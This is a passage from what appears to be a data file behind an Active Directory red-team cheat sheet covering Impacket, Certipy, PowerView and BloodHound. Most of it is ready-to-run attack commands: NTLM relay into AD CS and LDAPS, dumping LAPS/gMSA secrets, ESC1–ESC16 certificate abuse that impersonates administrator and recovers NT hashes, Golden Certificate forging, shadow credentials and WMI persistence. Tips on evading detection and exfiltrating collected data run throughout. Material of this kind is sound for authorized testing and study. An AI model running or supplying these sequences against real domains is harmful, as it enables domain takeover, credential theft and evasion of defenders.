                "cmd": "ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
              },
              {
                "label": "Shadow Credentials over LDAPS",
                "cmd": "ntlmrelayx.py -t ldaps://<dc> --shadow-credentials --shadow-target '<victim$>'"
              },
              {
                "label": "Harvest LAPS / gMSA while relaying",
                "cmd": "ntlmrelayx.py -t ldaps://<dc> --dump-laps --dump-gmsa"
              }
            ]
          },
          {
            "title": "DPAPI, persistence & misc utilities",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "wmipersist.py",
                "Install/remove WMI event-subscription persistence (filter + consumer)",
                "-name, -vbs/-filter, -timer, remove"
              ],
              [
                "wmiquery.py",
                "Run arbitrary WQL queries over WMI",
                "positional: query"
              ],
              [
                "mimikatz.py",
                "Mini-shell driving a remote Mimikatz RPC server (@gentilkiwi)",
                "standard auth"
              ],
              [
                "exchanger.py",
                "Interact with MS Exchange over RPC-over-HTTP v2 (NSPI, EWS-style tasks)",
                "-r, action subcommands"
              ],
              [
                "samedit.py",
                "Replace a local user's password through the SAM (offline/remote)",
                "standard auth"
              ],
              [
                "sniff.py / sniffer.py",
                "Simple packet sniffers",
                "(interface args)"
              ],
              [
                "ping.py / ping6.py",
                "ICMP / ICMPv6 ping built on the raw-packet classes",
                "src dst"
              ],
              [
                "split.py",
                "Split a pcap capture file",
                "positional: pcap"
              ],
              [
                "mqtt_check.py",
                "MQTT login probe — can be adapted into a password sprayer",
                "-username/-password"
              ],
              [
                "karmaSMB.py",
                "See NTLM relay & MITM",
                "-"
              ]
            ]
          },
          {
            "title": "Notes & OPSEC",
            "type": "notes",
            "items": [
              "Auth model is shared: a password in the target string, -hashes :<nt> (pass-the-hash), -aesKey (pass-the-key), or -k reading $KRB5CCNAME (pass-the-ticket). With -k you almost always also want -no-pass and -dc-ip, and the clock must be within ~5 min of the DC (ntpdate / faketime) or you get KRB_AP_ERR_SKEW.",
              "Exec footprint, loudest to quietest: psexec (drops a binary + creates a service) > smbexec/atexec (service / scheduled task, no binary) > wmiexec/dcomexec (no service). wmiexec is the usual default; use -silentcommand to skip the semi-interactive output channel.",
              "secretsdump -just-dc-ntlm pulls only NT hashes via DRSUAPI (quieter than -use-vss, which touches VSS on the DC). Offline mode (-sam/-system/-ntds ... LOCAL) parses hives you already exfiltrated.",
              "Distro packages prefix the scripts (impacket-secretsdump, impacket-wmiexec, …); a from-source clone runs them as examples/<name>.py. Pipx/venv installs expose the bare <name>.py.",
              "ntlmrelayx is the hub for coercion→relay: pair it with PetitPotam / PrinterBug / DFSCoerce (or mitm6) to feed it victim auth — see the Coercion & NTLM Relay theory and the AD map relay stage."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Impacket — GitHub (fortra)",
                "url": "https://github.com/fortra/impacket"
              },
              {
                "label": "Impacket — examples directory",
                "url": "https://github.com/fortra/impacket/tree/master/examples"
              },
              {
                "label": "Map — AD Attack Path (guided)",
                "url": "ad-map.html"
              },
              {
                "label": "Theory — Coercion & NTLM Relay",
                "url": "theory/2026-08-18-coercion-ntlm-relay.html"
              },
              {
                "label": "Theory — AD Certificate Services (ESC)",
                "url": "theory/2026-08-18-adcs.html"
              },
              {
                "label": "Theory — Kerberos Authentication",
                "url": "theory/2026-08-18-kerberos.html"
              }
            ]
          }
        ]
      },
      {
        id: "certipy",
        name: "Certipy",
        url: "https://github.com/ly4k/Certipy",
        description: "AD CS enumeration and abuse — every ESC1–ESC16 misconfiguration, detection, and exploitation path in one place.",
        brief: "Certipy audits and abuses Active Directory Certificate Services (AD CS). Misconfigured certificate templates and CA settings are one of the most common, highest-impact paths to full domain compromise — a single vulnerable template can be worth more than a whole chain of smaller AD misconfigurations, because the output is a certificate that authenticates as anyone.\n\nThis page treats the ESCx catalog (ESC1 through ESC16, including EKUwu/ESC15) as the core reference — what causes each one, how Certipy flags it, and the actual command sequence to exploit it — so this is the only page that needs to be open during a AD CS assessment.",
        quickReference: [
          { label: "Find every vulnerable template/CA in one pass", cmd: "certipy find -u user@domain.local -p pass -dc-ip <dc> -vulnerable" },
          { label: "Request a cert (ESC1-style)", cmd: "certipy req -u user@domain.local -p pass -ca <ca_name> -template <template> -upn administrator@domain.local" },
          { label: "Authenticate with the cert, recover the NT hash", cmd: "certipy auth -pfx administrator.pfx -dc-ip <dc>" },
          { label: "Relay a coerced auth into AD CS (ESC8)", cmd: "certipy relay -ca <ca_ip>" },
          { label: "Shadow credentials attack", cmd: "certipy shadow auto -u user@domain.local -p pass -account target_user" }
        ],
        sections: [
          {
            title: "Enumeration",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["certipy find -u user@domain.local -p pass -dc-ip <dc>", "Full enumeration of every CA and certificate template in the domain"],
              ["-vulnerable", "Only flag templates/CA configs that look exploitable — the fastest way to triage a large environment"],
              ["-old-bloodhound", "Emit BloodHound-compatible JSON so AD CS objects/edges show up in the graph alongside everything else"],
              ["-output <name>", "Write full results to file for later review (JSON + text)"],
              ["-text", "Print a quick human-readable summary to stdout instead of writing files"],
              ["-hashes <LM:NT>", "Authenticate with an NTLM hash instead of a password"],
              ["-k -dc-ip <dc>", "Authenticate with Kerberos using a ticket already in the environment's ccache"]
            ]
          },
          {
            title: "ESC Vulnerabilities — What Each One Actually Is",
            type: "table",
            columns: ["ESC", "Root Cause"],
            rows: [
              ["ESC1", "Template lets the requester supply any SAN (ENROLLEE_SUPPLIES_SUBJECT), allows client auth, needs no manager approval, and a low-priv principal has enrollment rights — request a cert impersonating anyone, including a Domain Admin"],
              ["ESC2", "Template has the \"Any Purpose\" EKU (or no EKU at all) — usable for client auth like ESC1, or to issue a subordinate CA certificate"],
              ["ESC3", "Template has the Certificate Request Agent EKU (an \"enrollment agent\" template) — lets the holder enroll on behalf of another user"],
              ["ESC4", "The template's own ACL is misconfigured — a low-priv principal can edit the template's configuration directly, e.g. rewrite it into an ESC1-shaped template"],
              ["ESC5", "Vulnerable ACLs on other PKI-related AD objects — the CA's computer object, the Certificate Templates container, NTAuthCertificates, etc."],
              ["ESC6", "CA-wide flag EDITF_ATTRIBUTESUBJECTALTNAME2 is set — lets a requester set an arbitrary SAN against ANY enabled template, not just an ESC1-shaped one"],
              ["ESC7", "A low-priv principal holds Manage CA or Manage Certificates rights on the CA itself — Manage CA can flip ESC6's flag or enable a dangerous template; Manage Certificates can approve a pending request"],
              ["ESC8", "AD CS web enrollment (HTTP) is enabled with NTLM auth — relay a coerced authentication into the enrollment endpoint to get a cert as the relayed account"],
              ["ESC9", "Template has msPKI-Enrollment-Flag's \"No Security Extension\" bit set — strips the requester's SID from the cert, which matters once weak certificate mapping is also in play"],
              ["ESC10", "The DC's CertificateMappingMethods registry value (or StrongCertificateBindingEnforcement) enables weak/UPN-based cert-to-account mapping — same end effect as ESC9, from the DC side"],
              ["ESC11", "The CA's ICPR RPC interface allows relay (IF_ENFORCEENCRYPTICERTREQUEST not set) — NTLM relay over RPC instead of HTTP to request a certificate"],
              ["ESC12", "The CA's private key is reachable via a weak-permissioned CAPI/KSP config, or an attacker has shell access to the CA host — extract or use the CA's key directly (\"Golden Certificate\")"],
              ["ESC13", "A template's issuance policy OID is linked to a privileged group via msDS-OIDToGroupLink — enrolling in the template grants effective membership in that group"],
              ["ESC14", "Weak explicit certificate mapping via a writable altSecurityIdentities attribute — map a certificate you control onto a victim account, then authenticate as them"],
              ["ESC15 / EKUwu", "CVE-2024-49019 — legacy V1 templates historically ignored a requester-supplied Application Policies extension, letting an attacker request a client-auth-capable cert off a template that should never allow it"],
              ["ESC16", "The szOID_NTDS_CA_SECURITY_EXT security extension is disabled globally (CA- or forest-wide) rather than per-template — same effect as ESC9, just not scoped to one template"]
            ]
          },
          {
            title: "ESC Exploitation Commands",
            type: "commands",
            commands: [
              { label: "ESC1 — enrollee-supplied SAN", cmd: "certipy req -u user@corp.local -p Pass123 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\ncertipy auth -pfx administrator.pfx -dc-ip <dc>" },
              { label: "ESC2 — Any Purpose / no EKU", cmd: "certipy req -u user@corp.local -p Pass123 -ca CORP-CA -template AnyPurposeTemplate -upn administrator@corp.local\ncertipy auth -pfx administrator.pfx -dc-ip <dc>" },
              { label: "ESC3 — Certificate Request Agent (enroll on behalf of)", cmd: "certipy req -u agent@corp.local -p Pass123 -ca CORP-CA -template EnrollmentAgentTemplate\ncertipy req -u agent@corp.local -p Pass123 -ca CORP-CA -template User -on-behalf-of 'CORP\\administrator' -pfx agent.pfx\ncertipy auth -pfx administrator.pfx -dc-ip <dc>" },
              { label: "ESC4 — vulnerable template ACL", cmd: "certipy template -u user@corp.local -p Pass123 -template VulnTemplate -save-old\ncertipy template -u user@corp.local -p Pass123 -template VulnTemplate -write-default-configuration\n# template is now ESC1-shaped — request as above, then restore it:\ncertipy template -u user@corp.local -p Pass123 -template VulnTemplate -configuration VulnTemplate.json" },
              { label: "ESC6 — CA-wide SAN override (EDITF_ATTRIBUTESUBJECTALTNAME2)", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\n# once the CA flag is confirmed, any enabled template becomes ESC1-exploitable:\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template User -upn administrator@corp.local" },
              { label: "ESC7 — Manage CA / Manage Certificates rights", cmd: "certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -add-officer user\ncertipy ca -u user@corp.local -p Pass123 -ca CORP-CA -enable-template SubCA\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template SubCA -upn administrator@corp.local" },
              { label: "ESC8 — NTLM relay to HTTP web enrollment", cmd: "certipy relay -ca <ca_ip>\n# from another session, coerce authentication toward this host (e.g. PetitPotam, PrinterBug)\n# Certipy issues the cert to the relayed account automatically" },
              { label: "ESC9 — no security extension on the cert", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template VulnTemplate\ncertipy auth -pfx cert.pfx -domain corp.local" },
              { label: "ESC10 — weak certificate mapping (DC-side)", cmd: "# same downstream exploitation as ESC9 — the weakness lives in the DC's CertificateMappingMethods registry value instead of the template\ncertipy auth -pfx cert.pfx -domain corp.local -dc-ip <dc>" },
              { label: "ESC11 — RPC relay to the CA (ICPR)", cmd: "certipy relay -ca <ca_ip> -icpr\n# coerce authentication toward this host over RPC instead of HTTP" },
              { label: "ESC12 — CA private key exposure (Golden Certificate)", cmd: "certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -backup\n# with the recovered CA cert + private key:\ncertipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -subject 'CN=administrator,CN=Users,DC=corp,DC=local'\ncertipy auth -pfx administrator_forged.pfx -dc-ip <dc>" },
              { label: "ESC13 — issuance policy linked to a group", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template LinkedPolicyTemplate\ncertipy auth -pfx cert.pfx -dc-ip <dc>\n# the resulting session carries effective membership in the linked group" },
              { label: "ESC14 — weak explicit mapping via altSecurityIdentities", cmd: "certipy account update -u user@corp.local -p Pass123 -user targetuser -upn administrator@corp.local\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template User\ncertipy auth -pfx cert.pfx -dc-ip <dc>" },
              { label: "ESC15 / EKUwu — V1 template application-policy injection (CVE-2024-49019)", cmd: "certipy req -u user@corp.local -p Pass123 -ca CORP-CA -template LegacyV1Template -application-policies 'Client Authentication'\ncertipy auth -pfx cert.pfx -dc-ip <dc>" },
              { label: "ESC16 — security extension disabled CA/forest-wide", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\n# flagged the same way as ESC9/ESC10 — exploit identically once confirmed\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template User\ncertipy auth -pfx cert.pfx -dc-ip <dc>" }
            ]
          },
          {
            title: "Requesting Certificates",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-ca <name>", "Target certificate authority to request from"],
              ["-template <name>", "Certificate template to request against"],
              ["-upn <upn>", "Identity to impersonate in the SAN, on a vulnerable (ESC1-style) template"],
              ["-dns <fqdn>", "Alternative to -upn when the target identity is machine-based rather than user-based"],
              ["-on-behalf-of <domain\\\\user>", "Enroll for another user via a Certificate Request Agent cert (ESC3)"],
              ["-application-policies <policy>", "Force an Application Policy into the request — relevant to ESC15/EKUwu"],
              ["-retrieve <id>", "Fetch a previously issued/pending certificate by request ID (useful after ESC7's Manage Certificates approves it)"]
            ]
          },
          {
            title: "CA & Template Management",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["certipy ca -ca <name> -list-templates", "List every template currently enabled on a CA"],
              ["certipy ca -ca <name> -enable-template <template>", "Enable a template on the CA (needs Manage CA rights — ESC7)"],
              ["certipy ca -ca <name> -add-officer <user>", "Grant a principal Manage Certificates/Officer rights on the CA (needs Manage CA — ESC7)"],
              ["certipy ca -ca <name> -backup", "Back up the CA's certificate and private key (needs admin on the CA host — feeds ESC12)"],
              ["certipy template -template <name> -save-old", "Save a template's current configuration before modifying it"],
              ["certipy template -template <name> -write-default-configuration", "Overwrite a writable template with an ESC1-shaped configuration (ESC4)"],
              ["certipy forge -ca-pfx <ca.pfx> -upn <upn>", "Forge a certificate directly from a compromised CA key — a Golden Certificate (ESC12)"]
            ]
          },
          {
            title: "Authentication",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["certipy auth -pfx admin.pfx -dc-ip <dc>", "Authenticate with an issued certificate and recover the account's NT hash"],
              ["-username / -domain", "Override the identity Certipy assumes the cert belongs to, if auto-detection from the cert is wrong"],
              ["-ldap-shell", "Drop into an interactive LDAP shell authenticated as the cert's identity instead of just recovering the hash"],
              ["Resulting NT hash", "Feed straight into NetExec, Impacket, or bloodyAD for pass-the-hash — this is usually the whole point of the cert"]
            ]
          },
          {
            title: "Shadow Credentials",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["certipy shadow auto -u user@corp.local -p pass -account target_user", "Add a shadow credential (msDS-KeyCredentialLink) to a target account without touching its password"],
              ["certipy shadow list -u user@corp.local -p pass -account target_user", "List existing key credentials on an account"],
              ["certipy shadow remove -u user@corp.local -p pass -account target_user -device-id <id>", "Remove a specific key credential once done — good cleanup practice"],
              ["Follow-up auth", "Certipy automatically requests a certificate + NT hash for the target using the new key material via PKINIT"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full triage-to-domain-admin pass", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable -output ad_cs\n# review ad_cs_Certipy.txt for anything flagged ESC1-ESC16\n# exploit the highest-impact finding using the matching command above" },
              { label: "Relay to AD CS (ESC8) end to end", cmd: "certipy relay -ca <ca_ip>\n# on a second host, coerce the target DC/host to authenticate to you:\n# e.g. PetitPotam.py <listener_ip> <target>\n# Certipy relays the auth and issues a certificate for the coerced account" },
              { label: "Shadow credentials → PKINIT → hash", cmd: "certipy shadow auto -u user@corp.local -p Pass123 -account target_user\n# Certipy authenticates via the new key material and prints the account's NT hash directly" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always run -vulnerable first on an unfamiliar environment — it's the fastest way to triage which of ESC1-ESC16 is actually present before manually exploiting anything.",
              "ESC8 and ESC11 both require NTLM authentication to be reachable/enabled on the CA (HTTP web enrollment for ESC8, the ICPR RPC interface for ESC11) — confirm before assuming either path is viable.",
              "ESC9, ESC10, and ESC16 are all variations on the same underlying weak certificate-to-account mapping problem — they differ only in where the weak setting lives (template, DC registry, or CA/forest-wide).",
              "ESC15/EKUwu (CVE-2024-49019) was patched in the November 2024 security update, and the ESC16 global security-extension enforcement landed in Microsoft's February 2025 update — both are worth explicitly checking patch level for on older environments.",
              "A hash returned from certipy auth is just an NT hash — everything downstream (NetExec, Impacket, bloodyAD) treats it the same as any other.",
              "These techniques directly forge or hijack domain identities — confirm written authorization before running any of them outside a lab."
            ]
          }
        ]
      },
      {
        id: "powerview",
        name: "PowerView",
        url: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
        description: "PowerShell library for deep Active Directory situational awareness and enumeration.",
        brief: "PowerView is a PowerShell reconnaissance library for Active Directory — domain, user, group, computer, ACL, and trust enumeration in far more depth than a single command-line tool typically offers. Almost every function follows the same Get-Domain* / Get-Net* naming pattern, so once one is familiar the rest read the same way.",
        quickReference: [
          { label: "Domain SID", cmd: "Get-DomainSID" },
          { label: "Basic domain info", cmd: "Get-Domain" },
          { label: "Domain users, filtered to the useful columns", cmd: "Get-DomainUser | Select samaccountname,logoncount" },
          { label: "Recursive group membership", cmd: "Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse" },
          { label: "Sweep for local admin access", cmd: "Find-LocalAdminAccess -Verbose" }
        ],
        sections: [
          {
            title: "Domain Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainSID", "Return the current domain's SID"],
              ["Get-Domain", "Basic info about the current domain"],
              ["Get-Domain -Domain <domain>", "Same, but targeting the forest root or another trusted domain"],
              ["Get-DomainPolicyData", "Domain policy, including max ticket lifetime — check this before hand-forging tickets, since Mimikatz/SafetyKatz default to a 10-year ticket that stands out immediately; Rubeus handles this matching automatically"],
              ["Get-DomainController", "List domain controllers for the current domain"],
              ["Get-NetLocalGroup -ComputerName <dc>", "List local groups on a specific host"],
              ["Get-NetLocalGroupMember -ComputerName <dc> -GroupName Administrators", "List members of a specific local group on a host"],
              ["Get-NetLoggedon -ComputerName <host>", "List logged-on users on a host — needs local admin on the target"],
              ["Get-NetLoggedonLocal -ComputerName <host>", "Same idea via a different technique — logon enumeration is noisy and leaves logs either way"],
              ["Get-LastLoggedOn -ComputerName <host>", "Show the last user logged on to a host"],
              ["Invoke-ShareFinder -Verbose", "Find shares across hosts in the current domain — noisy; PowerHuntShares is a quieter alternative for large-scale share hunting"],
              ["Invoke-FileFinder -Verbose", "Search discovered shares for sensitive filenames"],
              ["Get-NetFileServer", "List servers hosting file shares across the domain"]
            ]
          },
          {
            title: "User Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainUser", "Dump every domain user with every property — pipe into Select to cut the noise, e.g. | Select samaccountname,logoncount"],
              ["Get-DomainUser -Identity student1", "Details on a single user"],
              ["Get-DomainUser -Identity student1 -Properties *", "All properties for a single user"],
              ["Get-DomainUser -Properties samaccountname,logonCount", "Every user, but only the columns you actually need"],
              ["Get-DomainUser -LDAPFilter \"Description=*built*\" | Select name,description", "Search the Description field directly — a surprising number of environments still leave passwords or hints there"]
            ]
          },
          {
            title: "Computer Object Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainComputer", "Enumerate computer objects in the domain"]
            ]
          },
          {
            title: "Group Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainGroup admin | select name", "Search groups by name in the current domain"],
              ["Get-DomainGroup -Domain <domain>", "Same, targeting the forest root or another trusted domain"],
              ["Get-DomainGroup -UserName student1", "List a specific user's group memberships"]
            ]
          },
          {
            title: "Group Member Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse", "Fully expand nested group membership — flat membership queries miss members added via a nested group"]
            ]
          },
          {
            title: "ACL Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs", "Inbound: what rights other principals hold over this object"],
              ["Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser student1).ObjectSid}", "Outbound: what rights this principal holds over other objects"],
              ["Get-DomainObjectAcl -SearchBase \"LDAP://CN=Domain Admins,CN=Users,DC=<domain-dn>\" -ResolveGUIDs -Verbose", "Target a specific LDAP path directly instead of searching by name — -ResolveGUIDs makes the rights human-readable"],
              ["Find-InterestingDomainAcl -ResolveGUIDs", "Surface ACL misconfigurations across the domain automatically, instead of checking objects one at a time"]
            ]
          },
          {
            title: "OU Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainOU -Identity Student*", "Search OUs by name pattern"],
              ["Get-GPO -Guid 7478F170-6A0C-490C-B355-9E4618BC785D", "Resolve a GPO's friendly name from its GUID"],
              ["Get-DomainGPO -Identity 'DevOps Policy'", "Look up a GPO directly by name"]
            ]
          },
          {
            title: "Trust Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Get-DomainTrust -Domain <domain>", "List trust relationships for a domain"],
              ["Get-ForestGlobalCatalog", "List global catalog servers for the forest"],
              ["Get-ForestTrust", "List forest-level trust relationships"],
              ["Get-ForestDomain -Forest eurocorp.local", "List domains belonging to a specific forest"]
            ]
          },
          {
            title: "Local Admin Enumeration",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Find-LocalAdminAccess -Verbose", "Sweep the domain for hosts the current user has local admin on — noisy, expect roughly 3 log events per machine touched"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Initial domain situational awareness", cmd: "Get-Domain\nGet-DomainSID\nGet-DomainController\nGet-DomainPolicyData" },
              { label: "Finding a path to Domain Admin", cmd: "Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\nGet-DomainUser -Identity <target> -Properties *\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser <target>).ObjectSid}\nFind-InterestingDomainAcl -ResolveGUIDs" },
              { label: "Trust & forest mapping", cmd: "Get-DomainTrust\nGet-ForestDomain -Forest <forest>\nGet-ForestGlobalCatalog\nGet-ForestTrust" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Check Get-DomainPolicyData's max ticket lifetime before hand-forging tickets with Mimikatz/SafetyKatz — they default to a 10-year ticket, which stands out immediately against a normal policy. Rubeus matches the policy for you automatically.",
              "Get-NetLoggedon needs local admin on the target host to return anything.",
              "Get-NetLoggedonLocal and Invoke-ShareFinder are both noisy — prefer PowerHuntShares for large-scale share enumeration.",
              "LogonCount is a fast way to spot a stale/dormant privileged account — a Domain Admin account with a near-zero logon count is worth flagging.",
              "Find-LocalAdminAccess leaves log entries on every host it checks — budget for that noise on a monitored network.",
              "PowerView triggers AMSI/EDR fairly reliably on modern endpoints — expect to need obfuscation or an alternate loader outside a lab."
            ]
          }
        ]
      },
      {
        id: "bloodhound",
        name: "BloodHound",
        url: "https://github.com/SpecterOps/BloodHound",
        description: "Graphs Active Directory attack paths from collected relationship data.",
        brief: "BloodHound ingests Active Directory relationship data — group memberships, ACLs, sessions, delegation rights — and renders it as a graph, turning \"who can do what to whom\" into a visual attack path. The single most useful query on almost any engagement is shortest-path-to-Domain-Admin.",
        quickReference: [
          { label: "SharpHound — DCOnly (Windows)", cmd: "SharpHound.exe -c DCOnly --throttle 1000 --jitter 30" },
          { label: "bloodhound-python — DCOnly (Linux)", cmd: "bloodhound-python -u <user> -p '<pass>' -d bank.local -c DCOnly -dc dc01.bank.local -ns <dc-ip> --dns-tcp --zip" },
          { label: "nxc — DCOnly (NetExec)", cmd: "nxc ldap dc01.bank.local -u <user> -p '<pass>' --bloodhound -c DCOnly --dns-server <dc-ip>" },
          { label: "View — BloodHound CE", cmd: "docker compose up -d  →  http://localhost:8080  →  upload the .zip  →  \"Shortest Paths to Domain Admins\"" }
        ],
        sections: [
          {
            title: "Collectors at a glance",
            type: "table",
            columns: ["Component", "Role"],
            rows: [
              ["SharpHound", "The Windows/.NET ingestor — run from a domain-joined or domain-context host; richest session/local-admin data."],
              ["bloodhound-python", "Impacket-based ingestor — runs from Linux/remote with a credential, no domain-joined host needed."],
              ["nxc ldap --bloodhound", "NetExec's built-in collector — reuse an existing session; defaults to the BloodHound CE collector."],
              ["BloodHound CE", "The app itself — ingests any collector's .zip and draws the graph. Not a collector: it's where you view and query."],
              ["Collection method (-c)", "DCOnly (LDAP-only, quiet) up to All (adds Session/LoggedOn/LocalGroup — SMB to every host, loud)."]
            ]
          },
          {
            title: "SharpHound — Windows ingestor (OPSEC-safe)",
            type: "commands",
            commands: [
              { label: "DCOnly — LDAP to the DC only, no member-host touch", cmd: "SharpHound.exe -c DCOnly --outputdirectory C:\\Windows\\Temp\n# trusts, ACLs, group membership, GPOs, OUs and cert templates from the DC;\n# SKIPS Session/LoggedOn/LocalGroup, which otherwise reach EVERY host over SMB" },
              { label: "Throttle, jitter and pin one DC", cmd: "SharpHound.exe -c DCOnly --throttle 1000 --jitter 30 --domaincontroller dc01.bank.local\n#   --throttle 1000      ~1000 ms between requests\n#   --jitter 30          vary that delay by +/-30%\n#   --domaincontroller   one DC instead of fanning out" },
              { label: "Quiet session collection (only when you need sessions)", cmd: "SharpHound.exe -c Session --stealth --throttle 1500 --jitter 30\n# --stealth touches only the most reliable sources — far fewer hosts than a full sweep" },
              { label: "Then get the output off the host", cmd: "# exfil the C:\\Windows\\Temp\\*_BloodHound.zip and delete it —\n# don't leave collector output (sensitive loot) sitting on the target." }
            ]
          },
          {
            title: "bloodhound-python — Linux collector (OPSEC-safe)",
            type: "commands",
            commands: [
              { label: "DCOnly collection (recommended first pass)", cmd: "bloodhound-python -u <user> -p '<pass>' -d bank.local \\\n  -c DCOnly \\\n  -dc dc01.bank.local -ns <dc-ip> --dns-tcp \\\n  --zip\n#   -c DCOnly   LDAP to the DC only — no Session/LocalGroup SMB sweep\n#   -dc  the DC FQDN (must resolve)   -ns  use the DC as nameserver\n#   --dns-tcp  avoid flaky UDP on segmented/VPN networks   --zip  one upload-ready archive" },
              { label: "With an NT hash or a Kerberos ticket", cmd: "# pass-the-hash (empty LM):\nbloodhound-python -u <user> --hashes :<NT-hash> -d bank.local -c DCOnly -dc dc01.bank.local -ns <dc-ip> --zip\n# Kerberos — uses the TGT in $KRB5CCNAME (quieter, or when NTLM is disabled):\nexport KRB5CCNAME=<user>.ccache\nbloodhound-python -u <user> -k -d bank.local -c DCOnly -dc dc01.bank.local -ns <dc-ip> --zip" },
              { label: "Fix the two errors you hit first", cmd: "# name resolution — the -dc FQDN must resolve:\necho \"<dc-ip>  dc01.bank.local bank.local\" | sudo tee -a /etc/hosts\n# clock skew (KRB_AP_ERR_SKEW) — sync to the DC:\nsudo ntpdate <dc-ip>\n# note: bloodhound-python has NO throttle/jitter — DCOnly + a normal user is the OPSEC here" }
            ]
          },
          {
            title: "nxc (NetExec) — --bloodhound (OPSEC-safe)",
            type: "commands",
            commands: [
              { label: "DCOnly collection via NetExec", cmd: "nxc ldap dc01.bank.local -u <user> -p '<pass>' \\\n  --bloodhound -c DCOnly \\\n  --dns-server <dc-ip> --dns-tcp\n#   --bloodhound  defaults to the BloodHound CE collector\n#   -c DCOnly     LDAP-only; -c also takes All, ACL, Group, Trusts, ADCS, ... (comma-separated)\n#   output .zip lands in ~/.nxc/logs/" },
              { label: "With an NT hash or Kerberos", cmd: "# pass-the-hash:\nnxc ldap dc01.bank.local -u <user> -H <NT-hash> --bloodhound -c DCOnly --dns-server <dc-ip>\n# Kerberos:\nnxc ldap dc01.bank.local -u <user> -k --bloodhound -c DCOnly --dns-server <dc-ip>" },
              { label: "Add AD CS (ESC) edges — CE collector only", cmd: "nxc ldap dc01.bank.local -u <user> -p '<pass>' --bloodhound -c DCOnly,ADCS --dns-server <dc-ip>\n# ADCS collection is only compatible with the BloodHound-CE collector (the nxc default)" }
            ]
          },
          {
            title: "Alternative collectors (OPSEC)",
            type: "commands",
            commands: [
              { label: "AD Explorer snapshot — a signed MS tool, one LDAP connection", cmd: "# Sysinternals AD Explorer: connect to the DC, File -> Create Snapshot -> <name>.dat\n# it reads like legitimate admin activity and makes ONE LDAP connection (no mass sweep).\n# convert the snapshot offline into BloodHound JSON:\nADExplorerSnapshot.py <snapshot>.dat -o bh_out/" },
              { label: "BOFHound — collect through a beacon, no SharpHound on disk", cmd: "# run targeted LDAP from your C2 (the ldapsearch BOF) or pyldapsearch, then parse the\n# LOGS offline into BloodHound JSON — no collector process touches the target:\npyldapsearch bank.local/<user>:'<pass>' '(objectClass=*)' '*'\nbofhound -i ~/.pyldapsearch/logs/ -o bh_out/\n# (or point -i at your Cobalt Strike / beacon log directory)" },
              { label: "SOAPHound — collect over ADWS, not LDAP", cmd: "# uses AD Web Services (SOAP, tcp/9389) instead of LDAP, so it slips past\n# LDAP-query-based detections (SACL / event 1644, etc.):\nSOAPHound.exe --buildcache -c cache.txt\nSOAPHound.exe -c cache.txt --bhdump -o bh_out/" },
              { label: "RustHound-CE — one static binary, DCOnly", cmd: "# a dependency-free Rust collector; handy when you can't run .NET or Python on the box:\nrusthound-ce -d bank.local -u <user>@bank.local -p '<pass>' -z\n# -z zips the output for direct upload to BloodHound CE" }
            ]
          },
          {
            title: "BloodHound CE — load and view the graph",
            type: "commands",
            commands: [
              { label: "1. Start BloodHound CE (Docker)", cmd: "curl -L https://ghst.ly/getbhce -o docker-compose.yml\ndocker compose up -d\n# grab the one-time random admin password:\ndocker compose logs bloodhound | grep -i 'Initial Password'" },
              { label: "2. Log in and ingest", cmd: "# open http://localhost:8080  (admin + that password; it forces a reset on first login)\n# Administration -> File Ingest -> Upload File(s)\n# drop the collector's *_bloodhound.zip (or the loose *.json) and wait for 'Complete'" },
              { label: "3. View the graph", cmd: "# Explore -> run a built-in query, e.g. \"Shortest Paths to Domain Admins\"\n# or type Cypher directly:\nMATCH p=shortestPath((n)-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH \"-512\" RETURN p" }
            ]
